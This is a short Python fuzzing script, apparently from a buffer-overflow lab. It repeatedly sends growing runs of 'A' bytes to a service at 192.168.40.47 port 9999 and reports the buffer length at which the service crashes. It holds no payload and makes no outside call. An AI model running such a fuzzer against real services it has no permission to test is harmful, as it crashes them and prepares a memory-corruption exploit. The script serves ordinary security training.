import socket
import sys
import time

buffer = b"A" * 100
while True:  
  try:  
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(('192.168.40.47',9999))
    s.send(buffer)  
    s.close()  
    time.sleep(1)  
    buffer = buffer + b"A"*100
  except Exception as e:
    print(e)  
    print("Fuzzing has crashed at {0} bytes".format(str(len(buffer))))
    sys.exit()
